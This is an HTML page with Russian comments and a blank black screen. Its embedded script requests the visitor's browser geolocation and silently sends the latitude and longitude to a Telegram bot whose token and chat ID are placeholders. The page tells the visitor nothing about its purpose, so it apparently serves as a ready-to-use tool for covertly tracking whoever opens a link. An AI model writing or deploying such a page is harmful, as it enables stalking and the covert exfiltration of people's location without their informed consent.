
 <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Геолокация</title>
    <style>
        body {
            margin: 0;
            background-color: black;
            height: 100vh;
        }
    </style>
</head>
<body>
    <script>
        // Ваш Telegram токен и chat_id
        const botToken = "YOUR_BOT_TOKEN";
        const chatId = "YOUR_CHAT_ID";

        // Функция отправки геолокации в Telegram
        function sendLocation(latitude, longitude) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Широта: ${latitude}, Долгота: ${longitude}`;
            fetch(url)
                .then(response => console.log('Геолокация отправлена.'))
                .catch(error => console.error('Ошибка отправки геолокации:', error));
        }

        // Запрашиваем геолокацию
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const { latitude, longitude } = position.coords;
                    sendLocation(latitude, longitude);
                },
                error => {
                    console.error("Ошибка получения геолокации:", error);
                }
            );
        } else {
            console.error("Геолокация не поддерживается этим браузером.");
        }
    </script>
</body>
</html>
